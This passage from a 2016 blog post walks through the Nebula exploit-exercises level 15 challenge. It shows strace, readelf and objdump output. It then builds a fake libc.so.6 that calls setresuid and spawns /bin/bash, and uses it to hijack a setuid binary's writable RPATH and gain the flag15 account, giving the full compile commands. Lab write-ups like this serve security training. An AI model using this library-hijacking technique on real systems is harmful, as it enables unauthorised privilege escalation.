stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/sse2/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/sse2/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/sse2&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/cmov/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/cmov&quot;</span>, 0xbf8c25d4<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
stat64<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/var/tmp/flag15&quot;</span>, <span style="color: #f92672">{</span><span style="color: #f8f8f2">st_mode</span><span style="color: #f92672">=</span>S_IFDIR<span style="color: #f8f8f2">|</span>0775, <span style="color: #f8f8f2">st_size</span><span style="color: #f92672">=</span>3, ...<span style="color: #f92672">})</span> <span style="color: #f92672">=</span> 0
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY<span style="color: #f92672">)</span>      <span style="color: #f92672">=</span> 3
fstat64<span style="color: #f92672">(</span>3, <span style="color: #f92672">{</span><span style="color: #f8f8f2">st_mode</span><span style="color: #f92672">=</span>S_IFREG<span style="color: #f8f8f2">|</span>0644, <span style="color: #f8f8f2">st_size</span><span style="color: #f92672">=</span>33815, ...<span style="color: #f92672">})</span> <span style="color: #f92672">=</span> 0
mmap2<span style="color: #f92672">(</span>NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 0xb779e000
close<span style="color: #f92672">(</span>3<span style="color: #f92672">)</span>                                <span style="color: #f92672">=</span> 0
access<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK<span style="color: #f92672">)</span>      <span style="color: #f92672">=</span> -1 ENOENT <span style="color: #f92672">(</span>No such file or directory<span style="color: #f92672">)</span>
open<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>, O_RDONLY<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 3
read<span style="color: #f92672">(</span>3, <span style="color: #e6db74">&quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&quot;</span>..., 512<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 512
fstat64<span style="color: #f92672">(</span>3, <span style="color: #f92672">{</span><span style="color: #f8f8f2">st_mode</span><span style="color: #f92672">=</span>S_IFREG<span style="color: #f8f8f2">|</span>0755, <span style="color: #f8f8f2">st_size</span><span style="color: #f92672">=</span>1544392, ...<span style="color: #f92672">})</span> <span style="color: #f92672">=</span> 0
mmap2<span style="color: #f92672">(</span>NULL, 1554968, PROT_READ<span style="color: #f8f8f2">|</span>PROT_EXEC, MAP_PRIVATE<span style="color: #f8f8f2">|</span>MAP_DENYWRITE, 3, 0<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 0x6ea000
mmap2<span style="color: #f92672">(</span>0x860000, 12288, PROT_READ<span style="color: #f8f8f2">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #f8f8f2">|</span>MAP_FIXED<span style="color: #f8f8f2">|</span>MAP_DENYWRITE, 3, 0x176<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 0x860000
mmap2<span style="color: #f92672">(</span>0x863000, 10776, PROT_READ<span style="color: #f8f8f2">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #f8f8f2">|</span>MAP_FIXED<span style="color: #f8f8f2">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 0x863000
close<span style="color: #f92672">(</span>3<span style="color: #f92672">)</span>                                <span style="color: #f92672">=</span> 0
mmap2<span style="color: #f92672">(</span>NULL, 4096, PROT_READ<span style="color: #f8f8f2">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #f8f8f2">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 0xb779d000
set_thread_area<span style="color: #f92672">({</span>entry_number:-1 -&gt; 6, base_addr:0xb779d8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1<span style="color: #f92672">})</span> <span style="color: #f92672">=</span> 0
mprotect<span style="color: #f92672">(</span>0x860000, 8192, PROT_READ<span style="color: #f92672">)</span>     <span style="color: #f92672">=</span> 0
mprotect<span style="color: #f92672">(</span>0x8049000, 4096, PROT_READ<span style="color: #f92672">)</span>    <span style="color: #f92672">=</span> 0
mprotect<span style="color: #f92672">(</span>0x57b000, 4096, PROT_READ<span style="color: #f92672">)</span>     <span style="color: #f92672">=</span> 0
munmap<span style="color: #f92672">(</span>0xb779e000, 33815<span style="color: #f92672">)</span>               <span style="color: #f92672">=</span> 0
fstat64<span style="color: #f92672">(</span>1, <span style="color: #f92672">{</span><span style="color: #f8f8f2">st_mode</span><span style="color: #f92672">=</span>S_IFCHR<span style="color: #f8f8f2">|</span>0620, <span style="color: #f8f8f2">st_rdev</span><span style="color: #f92672">=</span>makedev<span style="color: #f92672">(</span>136, 0<span style="color: #f92672">)</span>, ...<span style="color: #f92672">})</span> <span style="color: #f92672">=</span> 0
mmap2<span style="color: #f92672">(</span>NULL, 4096, PROT_READ<span style="color: #f8f8f2">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #f8f8f2">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #f92672">)</span> <span style="color: #f92672">=</span> 0xb77a6000
write<span style="color: #f92672">(</span>1, <span style="color: #e6db74">&quot;strace it!\n&quot;</span>, 11strace it!
<span style="color: #f92672">)</span>            <span style="color: #f92672">=</span> 11
exit_group<span style="color: #f92672">(</span>11<span style="color: #f92672">)</span>                          <span style="color: #f92672">=</span> ?
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Some more information about the binary:


<figure class="code">
  <figcaption>
  	<span>ELF information</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:~$ readelf -d /home/flag15/flag15 

Dynamic section at offset 0xf20 contains <span style="color: #ae81ff">21</span> entries:
  Tag        Type                         Name/Value
 0x00000001 <span style="color: #f92672">(</span>NEEDED<span style="color: #f92672">)</span>                     Shared library: <span style="color: #f92672">[</span>libc.so.6<span style="color: #f92672">]</span>
 0x0000000f <span style="color: #f92672">(</span>RPATH<span style="color: #f92672">)</span>                      Library rpath: <span style="color: #f92672">[</span>/var/tmp/flag15<span style="color: #f92672">]</span>
 0x0000000c <span style="color: #f92672">(</span>INIT<span style="color: #f92672">)</span>                       0x80482c0
 0x0000000d <span style="color: #f92672">(</span>FINI<span style="color: #f92672">)</span>                       0x80484ac
 0x6ffffef5 <span style="color: #f92672">(</span>GNU_HASH<span style="color: #f92672">)</span>                   0x80481ac
 0x00000005 <span style="color: #f92672">(</span>STRTAB<span style="color: #f92672">)</span>                     0x804821c
 0x00000006 <span style="color: #f92672">(</span>SYMTAB<span style="color: #f92672">)</span>                     0x80481cc
 0x0000000a <span style="color: #f92672">(</span>STRSZ<span style="color: #f92672">)</span>                      <span style="color: #ae81ff">90</span> <span style="color: #f92672">(</span>bytes<span style="color: #f92672">)</span>
 0x0000000b <span style="color: #f92672">(</span>SYMENT<span style="color: #f92672">)</span>                     <span style="color: #ae81ff">16</span> <span style="color: #f92672">(</span>bytes<span style="color: #f92672">)</span>
 0x00000015 <span style="color: #f92672">(</span>DEBUG<span style="color: #f92672">)</span>                      0x0
 0x00000003 <span style="color: #f92672">(</span>PLTGOT<span style="color: #f92672">)</span>                     0x8049ff4
 0x00000002 <span style="color: #f92672">(</span>PLTRELSZ<span style="color: #f92672">)</span>                   <span style="color: #ae81ff">24</span> <span style="color: #f92672">(</span>bytes<span style="color: #f92672">)</span>
 0x00000014 <span style="color: #f92672">(</span>PLTREL<span style="color: #f92672">)</span>                     REL
 0x00000017 <span style="color: #f92672">(</span>JMPREL<span style="color: #f92672">)</span>                     0x80482a8
 0x00000011 <span style="color: #f92672">(</span>REL<span style="color: #f92672">)</span>                        0x80482a0
 0x00000012 <span style="color: #f92672">(</span>RELSZ<span style="color: #f92672">)</span>                      <span style="color: #ae81ff">8</span> <span style="color: #f92672">(</span>bytes<span style="color: #f92672">)</span>
 0x00000013 <span style="color: #f92672">(</span>RELENT<span style="color: #f92672">)</span>                     <span style="color: #ae81ff">8</span> <span style="color: #f92672">(</span>bytes<span style="color: #f92672">)</span>
 0x6ffffffe <span style="color: #f92672">(</span>VERNEED<span style="color: #f92672">)</span>                    0x8048280
 0x6fffffff <span style="color: #f92672">(</span>VERNEEDNUM<span style="color: #f92672">)</span>                 1
 0x6ffffff0 <span style="color: #f92672">(</span>VERSYM<span style="color: #f92672">)</span>                     0x8048276
 0x00000000 <span style="color: #f92672">(</span>NULL<span style="color: #f92672">)</span>                       0x0
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>So puting it all together - it looks like the binary is trying to load <em>libc.so.6</em> from <em>RPATH</em>, which is <em>/var/tmp/flag15</em>. Since we can write there - we can place a malicious <em>libc.so.6</em> file
and wait for the binary to load it.</p>

<p>The <em>flag15</em> binary has a few functions that we can work with:</p>

<p>

<figure class="code">
  <figcaption>
  	<span>Functions</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ objdump -R /home/flag15/flag15 

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>The <em>__libc_start_main</em> seems like the best candidate since it is executed upon loading the shared library.
A simple library code to try to execute bash:


<figure class="code">
  <figcaption>
  	<span>Library Code</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include</span> <span style="color: #75715e">&lt;stdio.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">__libc_start_main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">main)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span> <span style="color: #f92672">*</span> <span style="color: #f8f8f2">ubp_av,</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">init)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">fini)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">rtld_fini)</span> <span style="color: #f8f8f2">(</span><span style="color: #66d9ef">void</span><span style="color: #f8f8f2">),</span> <span style="color: #66d9ef">void</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span> <span style="color: #f8f8f2">stack_end))</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/bash&quot;</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>However, the library does not work:


<figure class="code">
  <figcaption>
  	<span>Library Error</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color: #f92672">(</span>required by /home/flag15/flag15<span style="color: #f92672">)</span>
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color: #f92672">(</span>required by /var/tmp/flag15/libc.so.6<span style="color: #f92672">)</span>
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available <span style="color: #f92672">(</span>required by /var/tmp/flag15/libc.so.6<span style="color: #f92672">)</span>
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link <span style="color: #f8f8f2">time</span> reference
level15@nebula:/var/tmp/flag15$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Some Googling shows that the &ldquo;version&rdquo; error can be solved by linking <em>version-script</em>:


<figure class="code">
  <figcaption>
  	<span>Version Script</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ cat version.txt 
GLIBC_2.0 <span style="color: #f92672">{</span>
<span style="color: #f92672">}</span><span style="color: #f8f8f2">;</span>
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -Wl,--version-script<span style="color: #f92672">=</span>version.txt -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version <span style="color: #e6db74">`</span>GLIBC_2.1.3<span style="color: #960050; background-color: #1e0010">&#39;</span> not found <span style="color: #f92672">(</span>required by /var/tmp/flag15/libc.so.6<span style="color: #f92672">)</span>
level15@nebula:/var/tmp/flag15$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Now another error, which can be solved by static linking options <em>-Bstatic</em> and <em>-static-libgcc</em>.
After adding those - the exploit works, but it seems that our user id is wrong:


<figure class="code">
  <figcaption>
  	<span>Flag wrong user id</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script<span style="color: #f92672">=</span>version.txt,-Bstatic -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
bash-4.2$ getflag
getflag is executing on a non-flag account, this doesn<span style="color: #960050; background-color: #1e0010">&#39;</span>t count
bash-4.2$ id
<span style="color: #f8f8f2">uid</span><span style="color: #f92672">=</span>1016<span style="color: #f92672">(</span>level15<span style="color: #f92672">)</span> <span style="color: #f8f8f2">gid</span><span style="color: #f92672">=</span>1016<span style="color: #f92672">(</span>level15<span style="color: #f92672">)</span> <span style="color: #f8f8f2">groups</span><span style="color: #f92672">=</span>1016<span style="color: #f92672">(</span>level15<span style="color: #f92672">)</span>
bash-4.2$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>We need to reset the efective user id to the real one with <em>setresuid()</em> and capture the flag:


<figure class="code">
  <figcaption>
  	<span>Flag15</span>
  </figcaption>
  <div class="codewrapper">
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level15@nebula:/var/tmp/flag15$ cat lib.c 
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>

int __libc_start_main<span style="color: #f92672">(</span>int <span style="color: #f92672">(</span>*main<span style="color: #f92672">)</span> <span style="color: #f92672">(</span>int, char * *, char * *<span style="color: #f92672">)</span>, int argc, char * * ubp_av, void <span style="color: #f92672">(</span>*init<span style="color: #f92672">)</span> <span style="color: #f92672">(</span>void<span style="color: #f92672">)</span>, void <span style="color: #f92672">(</span>*fini<span style="color: #f92672">)</span> <span style="color: #f92672">(</span>void<span style="color: #f92672">)</span>, void <span style="color: #f92672">(</span>*rtld_fini<span style="color: #f92672">)</span> <span style="color: #f92672">(</span>void<span style="color: #f92672">)</span>, void <span style="color: #f92672">(</span>* stack_end<span style="color: #f92672">))</span> <span style="color: #f92672">{</span>
    setresuid<span style="color: #f92672">(</span>geteuid<span style="color: #f92672">()</span>,geteuid<span style="color: #f92672">()</span>,geteuid<span style="color: #f92672">())</span><span style="color: #f8f8f2">;</span>
    system<span style="color: #f92672">(</span><span style="color: #e6db74">&quot;/bin/bash&quot;</span><span style="color: #f92672">)</span><span style="color: #f8f8f2">;</span>
<span style="color: #f92672">}</span>
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script<span style="color: #f92672">=</span>version.txt,-Bstatic -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
flag15@nebula:/var/tmp/flag15$ id
<span style="color: #f8f8f2">uid</span><span style="color: #f92672">=</span>984<span style="color: #f92672">(</span>flag15<span style="color: #f92672">)</span> <span style="color: #f8f8f2">gid</span><span style="color: #f92672">=</span>1016<span style="color: #f92672">(</span>level15<span style="color: #f92672">)</span> <span style="color: #f8f8f2">groups</span><span style="color: #f92672">=</span>984<span style="color: #f92672">(</span>flag15<span style="color: #f92672">)</span>,1016<span style="color: #f92672">(</span>level15<span style="color: #f92672">)</span>
flag15@nebula:/var/tmp/flag15$ getflag 
You have successfully executed getflag on a target account
flag15@nebula:/var/tmp/flag15$ 
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

        </div>
        

<footer>
  <p class="meta">
    <span class="byline author vcard">Posted by <span class="fn">Mindaugas Slusnys</span></span>
    
    <time>May 1, 2016</time>
    <span class="categories">
      Tags:
        
        
          <a class="category" href="http://mislusnys.github.io/tags/nebula">nebula</a>  <a class="category" href="http://mislusnys.github.io/tags/solution">solution</a>  
        
    </span>
  </p>

  
  

  

  <p class="meta">
    
        <a class="basic-alignment left" href="http://mislusnys.github.io/2015/02/06/owasp-top-10-in-mutillidae-part-2/" title="OWASP Top 10 in Mutillidae (Part2)">OWASP Top 10 in Mutillidae (Part2)</a>
    

    
  </p>
  
</footer>

      </article>
    </div>
    


<aside class="sidebar thirds">
  <section class="first odd">

    

    <p>
      
    </p>
  </section>

  



  <ul class="sidebar-nav">
    <li class="sidebar-nav-item">
      
      
      
       
      
      
      
      
      

    
    
    </li>
  </ul>

  
  <section class="even">
    <h1>Recent Posts</h1>

    
    <ul id="recent_posts">
      
      
        
      
      
      <li class="post">
        <a href="/2016/05/01/nebula-exploit-exercises/">Nebula Exploit Exercises</a>
      </li>
      
      <li class="post">
        <a href="/2015/02/06/owasp-top-10-in-mutillidae-part-2/">OWASP Top 10 in Mutillidae (Part2)</a>
      </li>
      
      <li class="post">
        <a href="/2015/02/03/owasp-top-10-in-mutillidae/">OWASP Top 10 in Mutillidae (Part1)</a>
      </li>
      
      <li class="post">
        <a href="/2015/02/02/damn-vulnerable-web-application/">Exploring Damn Vulnerable Web Application</a>
      </li>
      
      <li class="post">
        <a href="/archive/">All Posts</a>
      </li>
      
    </ul>
  </section>

</aside>

  </div>
</div>




<footer role="contentinfo">
  <p>Copyright &copy; 2016 Mindaugas Slusnys . 
  <span class="credit">Powered by <a target="_blank" href="https://gohugo.io">Hugo</a> and <a target="_blank" href="https://github.com/parsiya/hugo-octopress/">Hugo-Octopress</a> theme.
</p>

</footer>


</body>
</html>

